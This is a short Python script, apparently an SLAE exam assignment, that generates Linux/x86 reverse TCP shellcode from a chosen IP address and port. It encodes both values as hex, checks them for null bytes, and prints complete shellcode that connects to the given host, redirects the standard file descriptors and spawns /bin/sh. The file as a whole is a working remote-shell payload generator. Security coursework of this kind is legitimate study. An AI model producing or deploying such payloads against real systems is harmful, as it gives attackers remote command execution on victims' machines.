#!/usr/bin/python

# SLAE Exam Assignment #2: Shell Reverse TCP Shellcode (Linux/x86) Generator
# Author: Ray Doyle (@doylersec)
# Website: https://www.doyler.net

import struct

ip = "127.1.1.1"
port = 4444

if port > 65535:
    print "\nPort is greater than 65535.\n"
    exit()
elif port < 1024:
    print "\nPort is smaller than 1024. Note that root is required for this.\n"
    exit()

print "\nOriginal port: " + str(port)
print "Converted to hexidecimal: " + hex(port)[2:]

# https://stackoverflow.com/questions/13261109/python-string-of-binary-escape-sequences-as-literal
encodedPort = ''.join(map(lambda c:'\\x%02x'%c, map(ord, struct.pack('!H', port))))

if '\\x00' in encodedPort:
    print "Port contains null bytes, please modify!"
    exit()

print "\nOriginal IP: " + str(ip)
    
ip = ip.split('.')
hexIP = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip)).lower()

print "Converted to hexidecimal: " + hexIP

encodedIP = ''.join(r'\x' + hexIP[i:i+2] for i in range(0, len(hexIP), 2))

if '\\x00' in encodedIP:
    print "IP Address contains null bytes, please modify!"
    exit()

shellcode = ("\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6\\x56\\x53\\x6a" + 
    "\\x02\\x89\\xe1\\xcd\\x80\\x5f\\x97\\xb3\\x66\\x93\\x68" + encodedIP +  #\x7f\x01\x01\x01
    "\\x66\\x68" + encodedPort + "\\x66\\x53\\x43\\x89\\xe1\\x6a\\x10" + 
    "\\x51\\x57\\x89\\xe1\\xcd\\x80\\x87\\xdf\\x6a\\x02\\x59\\xb0\\x3f" + 
    "\\xcd\\x80\\x49\\x79\\xf9\\x56\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68" + 
    "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x41\\x31\\xd2\\xcd\\x80")

print "\nFinal shellcode"
print "--------------------"
print "\"" + shellcode + "\""